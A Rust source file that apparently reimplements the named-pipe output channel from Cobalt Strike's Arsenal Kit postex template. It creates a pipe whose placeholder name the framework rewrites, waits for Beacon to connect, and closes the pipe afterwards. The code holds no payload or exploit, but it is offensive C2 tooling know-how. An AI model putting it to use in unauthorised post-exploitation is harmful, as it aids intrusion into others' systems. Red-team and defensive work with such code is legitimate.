//! Postex named-pipe server. Mirrors `arsenal-kit/kits/postex/base/pipes.{h,cpp}`.
//!
//! CS rewrites the placeholder pipe name embedded in `G_PIPE_NAME` with
//! the actual pipe path before calling `DllEntryPoint(DLL_POSTEX_ATTACH)`.
//! The name string is found via raw byte pattern matching, so its content
//! and exact placeholder format MUST remain identical to the Arsenal Kit
//! template.
//!
//! `BeaconPrintf` / `BeaconOutput` proxies that smartinject installs in
//! the IAT all write to `G_PIPE_HANDLE`. Operator-side `bread_pipe` opens
//! the client end. The pipe must exist BEFORE bread_pipe runs, otherwise
//! the operator sees `ERROR_FILE_NOT_FOUND (2)` — which was the symptom
//! that prompted this v0.3.1 rewrite.

use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
use windows_sys::Win32::Storage::FileSystem::{FlushFileBuffers, PIPE_ACCESS_DUPLEX};
use windows_sys::Win32::System::Pipes::{
    ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe, PIPE_READMODE_MESSAGE,
    PIPE_TYPE_MESSAGE,
};
use windows_sys::Win32::System::Threading::Sleep;

/// Placeholder pipe path CS searches for and rewrites. Must include the
/// literal token `POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE`,
/// otherwise the loader pattern-match fails and we end up with a zero-
/// initialised path → `CreateNamedPipeA` returns `INVALID_HANDLE_VALUE`.
///
/// 64-byte buffer holding the placeholder path + NUL + tail padding.
/// Enough headroom for any reasonable pipe name; CS truncates the
/// rewritten string to fit and writes a NUL terminator.
///
/// `link_section = ".data"` so the loader can scribble into the bytes
/// without first flipping page protections.
#[unsafe(no_mangle)]
#[unsafe(link_section = ".data")]
pub static mut gPipeName: [u8; 64] = {
    let mut buf = [0u8; 64];
    // Source path: `\\.\pipe\POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE`
    // (57 chars), plus NUL byte. The remaining 6 bytes stay zero.
    let src: &[u8] = b"\\\\.\\pipe\\POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE";
    let mut i = 0;
    while i < src.len() {
        buf[i] = src[i];
        i += 1;
    }
    buf
};

/// Live pipe handle. `StartNamedPipeServer` writes the CreateNamedPipeA
/// result here; smartinject's BeaconOutput proxy reads it.
#[unsafe(no_mangle)]
pub static mut gPipeHandle: HANDLE = INVALID_HANDLE_VALUE;

/// 1 MiB. Matches `BUFFER_SIZE` in Arsenal Kit pipes.cpp.
const BUFFER_SIZE: u32 = 1024 * 1024;

/// Create the named pipe server and block until Beacon connects (or until
/// the 10-second budget runs out). Returns `true` on connect, `false` on
/// timeout/error.
///
/// # Safety
/// Mutates global pipe handle state. Must be called from DllEntryPoint at
/// most once per postex run.
pub unsafe fn start_named_pipe_server() -> bool {
    unsafe {
        // CS may have rewritten the name; either way, the buffer is a
        // NUL-terminated C string at this point.
        let name_ptr = core::ptr::addr_of_mut!(gPipeName) as *const u8;
        let h = CreateNamedPipeA(
            name_ptr,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE,
            1,
            BUFFER_SIZE,
            BUFFER_SIZE,
            0,
            core::ptr::null(),
        );
        if h == INVALID_HANDLE_VALUE {
            return false;
        }
        gPipeHandle = h;

        // Block until Beacon's client side connects, with the same 10-try
        // 1-second cadence Arsenal Kit uses. ConnectNamedPipe returns
        // non-zero once the client is on the other end.
        let mut timer = 0;
        loop {
            if timer == 10 {
                // Time-out — disconnect and close so we don't leave the
                // pipe lingering for an unrelated process to grab.
                let _ = DisconnectNamedPipe(h);
                let _ = CloseHandle(h);
                gPipeHandle = INVALID_HANDLE_VALUE;
                return false;
            }
            if ConnectNamedPipe(h, core::ptr::null_mut()) != 0 {
                return true;
            }
            Sleep(1000);
            timer += 1;
        }
    }
}

/// Tear down the pipe server. Best-effort — every step ignores errors so
/// we always reach `CloseHandle`. Mirrors `StopNamedPipeServer` in
/// pipes.cpp but does not short-circuit on the FlushFileBuffers failure
/// (we'd rather get a leaked handle than skip the close).
///
/// # Safety
/// Reads + nulls global pipe state.
pub unsafe fn stop_named_pipe_server() -> bool {
    unsafe {
        let h = gPipeHandle;
        if h == INVALID_HANDLE_VALUE {
            return false;
        }
        let _ = FlushFileBuffers(h);
        let _ = DisconnectNamedPipe(h);
        let ok = CloseHandle(h) != 0;
        gPipeHandle = INVALID_HANDLE_VALUE;
        ok
    }
}
